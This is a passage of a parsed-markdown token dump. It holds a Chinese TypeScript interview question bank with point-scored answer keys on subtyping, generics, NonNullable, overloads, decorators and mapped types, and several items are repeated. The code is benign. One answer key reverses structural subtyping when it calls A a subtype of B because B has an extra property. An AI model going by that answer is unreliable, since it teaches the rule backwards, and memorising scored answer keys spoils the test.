级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","task":false,"loose":false,"text":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","tokens":[{"type":"text","raw":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","text":"**1：** A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","text":" A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 定义一个泛型函数 `add<T>(a: T, b: T): T`，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问`add<number>(1, 2)`返回值类型是什么\\n\\n","depth":2,"text":"定义一个泛型函数 `add<T>(a: T, b: T): T`，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问`add<number>(1, 2)`返回值类型是什么","tokens":[{"type":"text","raw":"定义一个泛型函数 ","text":"定义一个泛型函数 ","escaped":false},{"type":"codespan","raw":"`add<T>(a: T, b: T): T`","text":"add<T>(a: T, b: T): T"},{"type":"text","raw":"，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问","text":"，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问","escaped":false},{"type":"codespan","raw":"`add<number>(1, 2)`","text":"add<number>(1, 2)"},{"type":"text","raw":"返回值类型是什么","text":"返回值类型是什么","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","task":false,"loose":false,"text":"**2：** 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","tokens":[{"type":"text","raw":"**2：** 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","text":"**2：** 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","text":" 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## `type MyType = string | number | null | undefined ，type Result = NonNullable<MyType>` 请问Result类型是什么？\\n\\n","depth":2,"text":"`type MyType = string | number | null | undefined ，type Result = NonNullable<MyType>` 请问Result类型是什么？","tokens":[{"type":"codespan","raw":"`type MyType = string | number | null | undefined ，type Result = NonNullable<MyType>`","text":"type MyType = string | number | null | undefined ，type Result = NonNullable<MyType>"},{"type":"text","raw":" 请问Result类型是什么？","text":" 请问Result类型是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","task":false,"loose":false,"text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"text","raw":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":"**2：** Result类型是 string | number 。因为NonNullable会排除null和undefined 。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","text":" Result类型是 string | number 。因为NonNullable会排除null和undefined 。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在TypeScript中实现函数重载？\\n\\n","depth":2,"text":"如何在TypeScript中实现函数重载？","tokens":[{"type":"text","raw":"如何在TypeScript中实现函数重载？","text":"如何在TypeScript中实现函数重载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","task":false,"loose":false,"text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"text","raw":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\"\\n```","lang":"typescript","text":"// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\""},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 在类中使用函数重载：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在类中使用函数重载：","task":false,"loose":false,"text":"**2：** 在类中使用函数重载：","tokens":[{"type":"text","raw":"**2：** 在类中使用函数重载：","text":"**2：** 在类中使用函数重载：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 在类中使用函数重载：","text":" 在类中使用函数重载：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nclass Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}\\n```","lang":"typescript","text":"class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## TypeScript中的装饰器是什么？如何使用？\\n\\n","depth":2,"text":"TypeScript中的装饰器是什么？如何使用？","tokens":[{"type":"text","raw":"TypeScript中的装饰器是什么？如何使用？","text":"TypeScript中的装饰器是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n- **4：** 常见的装饰器类型：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n","task":false,"loose":true,"text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","tokens":[{"type":"text","raw":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","text":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","escaped":false}]}]},{"type":"list_item","raw":"- **4：** 常见的装饰器类型：","task":false,"loose":true,"text":"**4：** 常见的装饰器类型：","tokens":[{"type":"text","raw":"**4：** 常见的装饰器类型：","text":"**4：** 常见的装饰器类型：","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 常见的装饰器类型：","text":" 常见的装饰器类型：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n```","lang":"typescript","text":"// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## TypeScript中的映射类型是什么？请举例说明\\n\\n","depth":2,"text":"TypeScript中的映射类型是什么？请举例说明","tokens":[{"type":"text","raw":"TypeScript中的映射类型是什么？请举例说明","text":"TypeScript中的映射类型是什么？请举例说明","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n- **2：** 示例：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n","task":false,"loose":true,"text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","tokens":[{"type":"text","raw":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","text":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 示例：","task":false,"loose":true,"text":"**2：** 示例：","tokens":[{"type":"text","raw":"**2：** 示例：","text":"**2：** 示例：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 示例：","text":" 示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n```","lang":"typescript","text":"// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 如何在TypeScript中实现函数重载？\\n\\n","depth":2,"text":"如何在TypeScript中实现函数重载？","tokens":[{"type":"text","raw":"如何在TypeScript中实现函数重载？","text":"如何在TypeScript中实现函数重载？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","task":false,"loose":false,"text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"text","raw":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":"**2：** 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","text":" 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\"\\n```","lang":"typescript","text":"// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === \'number\' && typeof b === \'number\') {\\n        return a + b;\\n    }\\n    if (typeof a === \'string\' && typeof b === \'string\') {\\n        return a.concat(b);\\n    }\\n    throw new Error(\'Parameters must be numbers or strings\');\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(\\"Hello \\", \\"World\\")); // \\"Hello World\\""},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 在类中使用函数重载：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 在类中使用函数重载：","task":false,"loose":false,"text":"**2：** 在类中使用函数重载：","tokens":[{"type":"text","raw":"**2：** 在类中使用函数重载：","text":"**2：** 在类中使用函数重载：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 在类中使用函数重载：","text":" 在类中使用函数重载：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\nclass Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}\\n```","lang":"typescript","text":"class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === \'number\' && typeof b === \'number\') {\\n            return a + b;\\n        }\\n        if (typeof a === \'string\' && typeof b === \'string\') {\\n            return a.concat(b);\\n        }\\n        throw new Error(\'Parameters must be numbers or strings\');\\n    }\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## TypeScript中的装饰器是什么？如何使用？\\n\\n","depth":2,"text":"TypeScript中的装饰器是什么？如何使用？","tokens":[{"type":"text","raw":"TypeScript中的装饰器是什么？如何使用？","text":"TypeScript中的装饰器是什么？如何使用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 